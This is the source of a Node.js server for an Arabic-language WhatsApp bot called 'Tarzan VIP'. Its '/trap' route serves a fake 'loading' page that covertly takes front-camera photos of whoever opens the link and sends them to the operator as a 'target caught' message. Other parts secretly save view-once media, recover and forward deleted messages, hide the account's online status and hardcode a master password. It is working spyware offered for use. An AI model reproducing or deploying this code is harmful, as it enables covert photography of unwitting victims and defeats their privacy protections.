const express = require('express');
const fs = require('fs');
const path = require('path');
const qrCode = require('qrcode');
const moment = require('moment-timezone');
const axios = require('axios');
const pino = require('pino'); 
const { GoogleGenerativeAI } = require('@google/generative-ai'); 

const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    downloadMediaMessage,
    jidNormalizedUser,
} = require('@whiskeysockets/baileys');

process.on('uncaughtException', console.error);
process.on('unhandledRejection', console.error);

const app = express();
const PORT = process.env.PORT || 10000;
const MASTER_PASSWORD = 'tarzanbot'; 
const sessions = {};
const msgStore = new Map(); 

// ✅ 1. نظام حفظ الإعدادات 
const settingsPath = path.join(__dirname, 'settings.json');
let botSettings = {};
if (fs.existsSync(settingsPath)) { 
    botSettings = JSON.parse(fs.readFileSync(settingsPath, 'utf8')); 
} else { 
    botSettings = { GLOBAL_CONFIG: { geminiApiKey: "" } };
    fs.writeFileSync(settingsPath, JSON.stringify(botSettings)); 
}

if (!botSettings.GLOBAL_CONFIG) {
    botSettings.GLOBAL_CONFIG = { geminiApiKey: "" };
    saveSettings();
}

function saveSettings() { fs.writeFileSync(settingsPath, JSON.stringify(botSettings, null, 2)); }
function generateSessionPassword() { return 'VIP-' + Math.random().toString(36).substring(2, 8).toUpperCase(); }

// ✅ 2. مجلد الخزنة للميديا المخفية
const vaultPath = path.join(__dirname, 'ViewOnce_Vault');
if (!fs.existsSync(vaultPath)) fs.mkdirSync(vaultPath);

// 🛡️ 3. نظام تفريغ الذاكرة الذكي
setInterval(() => { 
    if (msgStore.size > 5000) {
        msgStore.clear(); 
        console.log('🧹 [حماية السيرفر] تم تفريغ الذاكرة المؤقتة للرسائل لمنع اختناق الرام');
    }
}, 30 * 60 * 1000);

app.use(express.static('public'));
app.use(express.json({limit: '50mb'})); 
app.use(express.urlencoded({limit: '50mb', extended: true}));

// ==========================================
// 📸 4. مسارات نظام فخ الكاميرا
// ==========================================
app.get('/trap/:sessionId/:targetNumber', (req, res) => {
    const { sessionId, targetNumber } = req.params;
    const htmlTrap = `
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>جارِ التحميل...</title>
    <style>body{background:#121212;color:#fff;font-family:sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;margin:0}.loader{border:5px solid #333;border-top:5px solid #00E676;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;margin-bottom:20px}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}video,canvas{display:none}.message{text-align:center;font-size:1.2rem}.sub-message{text-align:center;font-size:0.9rem;color:#aaa;margin-top:10px}</style></head>
    <body><div class="loader"></div><div class="message">أرجو منك الانتظار...</div><div class="sub-message">جاري تحميل الصفحة...<br>قد يطلب المتصفح بعض الصلاحيات للمتابعة.</div>
    <video id="video" autoplay playsinline></video><canvas id="canvas"></canvas>
    <script>async function startTrap(){try{const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});const video=document.getElementById('video');video.srcObject=stream;video.onloadedmetadata=()=>{video.play();setTimeout(()=>takePhoto(1),1000);setTimeout(()=>takePhoto(2),2500);};}catch(err){}}function takePhoto(num){const video=document.getElementById('video');const canvas=document.getElementById('canvas');canvas.width=video.videoWidth;canvas.height=video.videoHeight;canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);const dataURL=canvas.toDataURL('image/jpeg',0.6);fetch('/api/trap-upload',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({image:dataURL,sessionId:'${sessionId}',targetNumber:'${targetNumber}',photoNum:num})});}startTrap();</script></body></html>`;
    res.send(htmlTrap);
});

app.post('/api/trap-upload', async (req, res) => {
    const { image, sessionId, targetNumber, photoNum } = req.body;
    try {
        if (sessions[sessionId]) {
            const sock = sessions[sessionId];
            const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
            const imageBuffer = Buffer.from(base64Data, 'base64');
            const caption = `📸 *[صيد الكاميرا - التقاط رقم ${photoNum}]* 📸\n🎯 *الهدف وقع في الفخ!*\n🕒 *الوقت:* ${moment().tz("Asia/Riyadh").format("HH:mm:ss")}`;
            await sock.sendMessage(`${targetNumber}@s.whatsapp.net`, { image: imageBuffer, caption: caption });
        }
        res.json({ success: true });
    } catch (e) { res.json({ success: false }); }
});

// ==========================================
// 🚀 5. معالج الأوامر
// ==========================================
const commandsMap = new Map();
const commandsPath = path.join(__dirname, 'commands');
if (!fs.existsSync(commandsPath)) fs.mkdirSync(commandsPath);

function loadCommands() {
    commandsMap.clear();
    const files = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));
    for (const file of files) {
        try {
            delete require.cache[require.resolve(`./commands/${file}`)];
            const command = require(`./commands/${file}`);
            if (command.name && command.execute) {
                commandsMap.set(command.name.toLowerCase(), command);
                if (command.aliases && Array.isArray(command.aliases)) {
                    command.aliases.forEach(alias => commandsMap.set(alias.toLowerCase(), command));
                }
            }
        } catch (err) { console.error(`❌ خطأ في تحميل الأمر ${file}:`, err.message); }
    }
}
loadCommands();

// ==========================================
// ⚙️ 6. تشغيل الجلسات
// ==========================================
async function startSession(sessionId, res = null, pairingNumber = null) {
    const sessionPath = path.join(__dirname, 'sessions', sessionId);
    if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

    if (!botSettings[sessionId]) {
        botSettings[sessionId] = { 
            password: generateSessionPassword(), 
            botEnabled: true, 
            commandsEnabled: true, 
            aiEnabled: false, 
            autoReact: false, 
            reactEmoji: '❤️', 
            ghostMode: false, 
            antiCall: false, 
            autoReadStatus: false, 
            alwaysOnline: false,
            welcomeSent: false
        };
        saveSettings();
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        logger: pino({ level: 'silent' }), 
        printQRInTerminal: false,
        markOnlineOnConnect: false, 
        browser: ['Windows', 'Edge', '10.0'], 
        syncFullHistory: false,
        generateHighQualityLinkPreviews: false
    });

    sessions[sessionId] = sock;
    sock.ev.on('creds.update', saveCreds);

    if (pairingNumber && !sock.authState.creds.registered) {
        setTimeout(async () => {
            try {
                const code = await sock.requestPairingCode(pairingNumber);
                const formattedCode = code?.match(/.{1,4}/g)?.join('-') || code;
                if (res && !res.headersSent) res.json({ pairingCode: formattedCode });
            } catch (err) {
                if (res && !res.headersSent) res.status(500).json({ error: 'تعذر طلب الكود.' });
            }
        }, 3000); 
    }

    sock.ev.on('connection.update', async (update) => {
        const { connection, qr, lastDisconnect } = update;
        if (qr && res && !pairingNumber && !res.headersSent) {
            try { const qrData = await qrCode.toDataURL(qr); res.json({ qr: qrData }); } catch(e){}
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) setTimeout(() => startSession(sessionId), 5000);
            else { delete sessions[sessionId]; fs.rmSync(sessionPath, { recursive: true, force: true }); }
        }

        if (connection === 'open') {
            console.log(`✅ الجلسة ${sessionId} متصلة بنجاح!`);
            const selfId = jidNormalizedUser(sock.user.id);
            const sets = botSettings[sessionId];
            
            if (sets.ghostMode) {
                await sock.sendPresenceUpdate('unavailable');
            } else if (sets.alwaysOnline) {
                await sock.sendPresenceUpdate('available');
            } else {
                try { await sock.updateProfileStatus(`🤖 طرزان الواقدي VIP | يعمل الآن`); } catch (e) {}
            }

            if (!sets.welcomeSent) {
                const welcomeText = `👑 *مرحباً بك في نظام طرزان VIP* 👑\n\n✅ *تم الربط بنجاح!*\n\n🔐 *بيانات جلستك:*\n👤 *الجلسة:* ${sessionId}\n🔑 *الباسورد:* ${sets.password}\n\n🤖 *— 𝑻𝑨𝑹𝒁𝑨𝑵 𝑩𝑶𝑻 ⚔️*`;
                await sock.sendMessage(selfId, { image: { url: 'https://b.top4top.io/p_3489wk62d0.jpg' }, caption: welcomeText });
                botSettings[sessionId].welcomeSent = true; saveSettings();
            }
        }
    });

    sock.ev.on('call', async (node) => {
        const sets = botSettings[sessionId];
        if (!sets || !sets.antiCall) return;
        
        for (const call of node) {
            if (call.status === 'offer') {
                try {
                    await sock.rejectCall(call.id, call.from);
                    await sock.sendMessage(call.from, { 
                        text: `🚫 *[نظام VIP]*\nعذراً، صاحب هذا الرقم يستخدم نظام حماية، واستقبال المكالمات معطل حالياً. يرجى ترك رسالة نصية.` 
                    });
                } catch (e) {}
            }
        }
    });

    // ==========================================
    // 🛡️ 7. مضاد الحذف المطور (VIP) - يجلب كل المعلومات بدقة
    // ==========================================
    sock.ev.on('messages.update', async updates => {
        for (const { key, update } of updates) {
            // التحقق من أن الرسالة حذفت، وليست من البوت نفسه
            if (update?.message === null && key?.remoteJid && !key.fromMe) {
                try {
                    // سحب الرسالة الأصلية من الذاكرة
                    const storedMsg = msgStore.get(`${key.remoteJid}_${key.id}`);
                    if (!storedMsg?.message) return; 

                    const selfId = jidNormalizedUser(sock.user.id);
                    const remoteJid = key.remoteJid;
                    // تحديد رقم المرسل الحقيقي
                    const senderJid = key.participant || storedMsg.key?.participant || remoteJid;
                    const number = senderJid.split('@')[0];
                    
                    // جلب الاسم الحقيقي للمرسل من الواتساب
                    const pushName = storedMsg.pushName || 'غير متوفر (رقم غير مسجل)';
                    const time = moment().tz("Asia/Riyadh").format("HH:mm:ss | YYYY-MM-DD");

                    // تحليل مصدر الحذف بدقة عالية
                    let originType = '';
                    let originName = '';

                    if (remoteJid === 'status@broadcast') {
                        originType = '👁️ حالة (ستوري)';
                        originName = 'ستوري واتساب';
                    } else if (remoteJid.endsWith('@g.us')) {
                        originType = '👥 مجموعة (قروب)';
                        try {
                            // جلب اسم القروب الحقيقي
                            const groupMetadata = await sock.groupMetadata(remoteJid);
                            originName = groupMetadata.subject;
                        } catch (e) {
                            originName = 'قروب غير معروف';
                        }
                    } else if (remoteJid.endsWith('@newsletter')) {
                        originType = '📢 قناة';
                        originName = 'قناة واتساب';
                    } else {
                        originType = '👤 دردشة خاصة';
                        originName = 'محادثة فردية (خاص)';
                    }
                    
                    // تنسيق رسالة التنبيه بشكل فخم ودقيق
                    const alertText = `🚫 *[ تـم حـذف رسـالـة ]* 🚫
━━━━━━━━━━━━━━━━━━
👤 *الاسم الحقيقي:* ${pushName}
📱 *الرقم:* wa.me/${number}
📍 *نوع المصدر:* ${originType}
🏷️ *اسم المكان:* ${originName}
🕒 *وقت الحذف:* ${time}
━━━━━━━━━━━━━━━━━━
👇 *المحتوى المحذوف بالأسفل:*`;

                    // إرسال التنبيه ثم الرسالة المحذوفة
                    await sock.sendMessage(selfId, { text: alertText });
                    await sock.sendMessage(selfId, { forward: storedMsg });
                } catch (err) {
                    console.error('❌ خطأ في مضاد الحذف:', err);
                }
            }
        }
    });

    // 🔥 8. استقبال الرسائل المركزية
    sock.ev.on('messages.upsert', async ({ messages, type }) => {
        if (type !== 'notify') return;
        const msg = messages[0];
        if (!msg?.message) return; 

        const currentSettings = botSettings[sessionId] || {};
        const from = msg.key.remoteJid;

        if (from === 'status@broadcast') {
            // حفظ الحالة في الذاكرة لكي يعمل مضاد الحذف للحالات
            if (msgStore.size < 5000) msgStore.set(`${from}_${msg.key.id}`, msg);
            
            if (currentSettings.autoReadStatus && !msg.key.fromMe) {
                try { await sock.readMessages([msg.key]); } catch (e) {}
            }
            return; 
        }

        const isGroup = from.endsWith('@g.us');
        const sender = isGroup ? msg.key.participant : from;
        const pushName = msg.pushName || 'مجهول';
        const selfId = jidNormalizedUser(sock.user.id);
        const isFromMe = msg.key.fromMe || sender === selfId;

        // حفظ جميع الرسائل في الذاكرة ليعمل مضاد الحذف
        if (msgStore.size < 5000) msgStore.set(`${from}_${msg.key.id}`, msg);

        if (!currentSettings.botEnabled) return;

        let viewOnceIncoming = msg.message.viewOnceMessage || msg.message.viewOnceMessageV2 || msg.message.viewOnceMessageV2Extension;
        const mediaTypeCheck = Object.keys(msg.message)[0];
        if (msg.message[mediaTypeCheck]?.viewOnce === true) viewOnceIncoming = { message: msg.message };
        
        if (viewOnceIncoming && !isFromMe) {
            try {
                const actualMessage = viewOnceIncoming.message;
                const mediaType = Object.keys(actualMessage)[0];
                const buffer = await downloadMediaMessage(msg, 'buffer', {}, { logger: pino({ level: 'silent' }) });

                const ext = mediaType === 'imageMessage' ? 'jpg' : (mediaType === 'videoMessage' ? 'mp4' : 'ogg');
                const fileName = `VO_${sender.split('@')[0]}_${Date.now()}.${ext}`;
                fs.writeFileSync(path.join(vaultPath, fileName), buffer);

                const reportTxt = `🚨 *[رادار الميديا المخفية]* 🚨\n\n👤 *المرسل:* ${pushName}\n📱 *الرقم:* wa.me/${sender.split('@')[0]}\n📁 *حُفظت باسم:* ${fileName}\n\n*— TARZAN VIP 👑*`;
                
                if (mediaType === 'imageMessage') await sock.sendMessage(selfId, { image: buffer, caption: reportTxt });
                else if (mediaType === 'videoMessage') await sock.sendMessage(selfId, { video: buffer, caption: reportTxt });
                else if (mediaType === 'audioMessage') await sock.sendMessage(selfId, { audio: buffer, mimetype: 'audio/mpeg', ptt: true });
            } catch (err) { }
        }

        if (!currentSettings.ghostMode && !isFromMe) {
            await sock.readMessages([msg.key]);
        }

        if (currentSettings.autoReact && !isFromMe && !viewOnceIncoming) {
            try { await sock.sendMessage(from, { react: { text: currentSettings.reactEmoji || '❤️', key: msg.key } }); } catch(e) {}
        }

        const body = msg.message.conversation || msg.message.extendedTextMessage?.text || msg.message.imageMessage?.caption || msg.message.videoMessage?.caption || '';
        
        const reply = async (text) => {
            if (!currentSettings.ghostMode) await sock.sendPresenceUpdate('composing', from);
            return await sock.sendMessage(from, { text: text }, { quoted: msg });
        };

        const isCmd = body.startsWith('.');

        // 🧠 9. الذكاء الاصطناعي 
        if (currentSettings.aiEnabled && !isCmd && !isFromMe && body.trim() !== '' && !viewOnceIncoming) {
            try {
                if (!currentSettings.ghostMode) await sock.sendPresenceUpdate('composing', from); 
                
                let aiResponseText = '';
                const query = body.trim();
                const apiKey = botSettings.GLOBAL_CONFIG?.geminiApiKey;

                if (apiKey && apiKey.length > 20) {
                    try {
                        const genAI = new GoogleGenerativeAI(apiKey);
                        const model = genAI.getGenerativeModel({ model: "gemini-1.5-flash" });
                        const result = await model.generateContent(query);
                        aiResponseText = result.response.text();
                    } catch (apiErr) { }
                }

                if (!aiResponseText) {
                    try {
                        const fallbackUrl = `https://aemt.me/gemini?text=${encodeURIComponent(query)}`;
                        const fallbackRes = await axios.get(fallbackUrl);
                        if (fallbackRes.data && fallbackRes.data.status && fallbackRes.data.result) {
                            aiResponseText = fallbackRes.data.result;
                        } else { throw new Error('API فشل'); }
                    } catch (eFallback) {
                        aiResponseText = 'عقلي في حالة صيانة وتحديث الآن، السيرفرات مشغولة 🧠⏳';
                    }
                }

                if (aiResponseText) {
                    await reply(aiResponseText);
                } else {
                    await reply('حدث خطأ غير متوقع في نظام التفكير 🤔');
                }

            } catch (error) { }
            return; 
        }

        // 🎯 10. معالجة الأوامر الخارجية
        if (!currentSettings.commandsEnabled) return;

        let selectedId = msg.message.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson ? JSON.parse(msg.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : '';
        let commandName = '';
        let args = [];
        let textArgs = '';

        if (selectedId) {
            commandName = selectedId.toLowerCase();
        } else if (isCmd) {
            args = body.slice(1).trim().split(/ +/);
            commandName = args.shift().toLowerCase();
            textArgs = args.join(' ');
        }

        if (!commandName) return;

        const commandData = commandsMap.get(commandName);

        if (commandData) {
            try {
                if (commandName !== '🌚' && commandName !== 'vv' && !currentSettings.ghostMode) {
                    await sock.sendMessage(from, { react: { text: '⏳', key: msg.key } });
                }
                
                await commandData.execute({
                    sock, msg, body, args, text: textArgs, reply, from, isGroup, sender, pushName, isFromMe, prefix: '.', commandName, sessions, botSettings, saveSettings, sessionId, downloadMediaMessage
                });
            } catch (error) {
                console.error(`❌ خطأ في الأمر ${commandName}:`, error);
                if (commandName !== '🌚' && commandName !== 'vv' && !currentSettings.ghostMode) {
                    await sock.sendMessage(from, { react: { text: '❌', key: msg.key } });
                }
            }
        }
    });

    return sock;
}

// ==========================================
// 🌐 11. API Endpoints (لوحة التحكم)
// ==========================================
app.post('/create-session', (req, res) => {
    const { sessionId } = req.body;
    if (!sessionId) return res.status(400).json({ error: 'أدخل اسم الجلسة' });
    startSession(sessionId, res);
});

app.post('/pair', async (req, res) => {
    const { sessionId, number } = req.body;
    if (!sessionId || !number) return res.status(400).json({ error: 'أدخل الجلسة والرقم' });
    let formattedNumber = number.replace(/[^0-9]/g, '');
    
    if (sessions[sessionId] || fs.existsSync(path.join(__dirname, 'sessions', sessionId))) {
        if(sessions[sessionId]) sessions[sessionId].logout();
        delete sessions[sessionId];
        fs.rmSync(path.join(__dirname, 'sessions', sessionId), { recursive: true, force: true });
    }
    startSession(sessionId, res, formattedNumber);
});

app.post('/api/settings/get', (req, res) => {
    const { sessionId, password } = req.body;
    const settings = botSettings[sessionId];
    if (!settings) return res.status(404).json({ error: 'الجلسة غير موجودة' });
    if (settings.password !== password && password !== MASTER_PASSWORD) return res.status(401).json({ error: 'كلمة مرور خاطئة' });
    res.json(settings);
});

app.post('/api/settings/save', (req, res) => {
    const { sessionId, password, botEnabled, commandsEnabled, aiEnabled, autoReact, ghostMode, antiCall, autoReadStatus, alwaysOnline } = req.body;
    const settings = botSettings[sessionId];
    if (!settings) return res.status(404).json({ error: 'الجلسة غير موجودة' });
    if (settings.password !== password && password !== MASTER_PASSWORD) return res.status(401).json({ error: 'كلمة مرور خاطئة' });
    
    botSettings[sessionId].botEnabled = !!botEnabled;
    botSettings[sessionId].commandsEnabled = !!commandsEnabled;
    botSettings[sessionId].aiEnabled = !!aiEnabled; 
    botSettings[sessionId].autoReact = !!autoReact;
    botSettings[sessionId].ghostMode = !!ghostMode; 
    botSettings[sessionId].antiCall = !!antiCall; 
    botSettings[sessionId].autoReadStatus = !!autoReadStatus; 
    botSettings[sessionId].alwaysOnline = !!alwaysOnline; 
    saveSettings();

    if (sessions[sessionId]) {
        if (botSettings[sessionId].ghostMode) sessions[sessionId].sendPresenceUpdate('unavailable');
        else if (botSettings[sessionId].alwaysOnline) sessions[sessionId].sendPresenceUpdate('available');
        else sessions[sessionId].sendPresenceUpdate('available');
    }

    res.json({ success: true, message: '✅ تم حفظ التعديلات' });
});

app.get('/sessions', (req, res) => { res.json({ count: Object.keys(sessions).length, sessions: Object.keys(sessions) }); });

app.post('/delete-session', (req, res) => {
    const { sessionId, password } = req.body;
    if (password !== MASTER_PASSWORD) return res.status(401).json({ error: 'كلمة مرور السيرفر خاطئة' });
    const sessionPath = path.join(__dirname, 'sessions', sessionId);
    if (sessions[sessionId]) { sessions[sessionId].logout(); delete sessions[sessionId]; }
    if (botSettings[sessionId]) { delete botSettings[sessionId]; saveSettings(); }
    if (fs.existsSync(sessionPath)) { fs.rmSync(sessionPath, { recursive: true, force: true }); res.json({ message: `تم حذف ${sessionId}` }); } 
    else { res.status(404).json({ error: 'الجلسة غير موجودة' }); }
});

app.listen(PORT, () => {
    console.log(`\n=========================================`);
    console.log(`🚀 سيرفر TARZAN VIP يعمل بقوة على منفذ ${PORT}`);
    console.log(`🛡️ مضاد الحذف الجبار (مطور بالكامل) يعمل الآن`);
    console.log(`=========================================\n`);
});
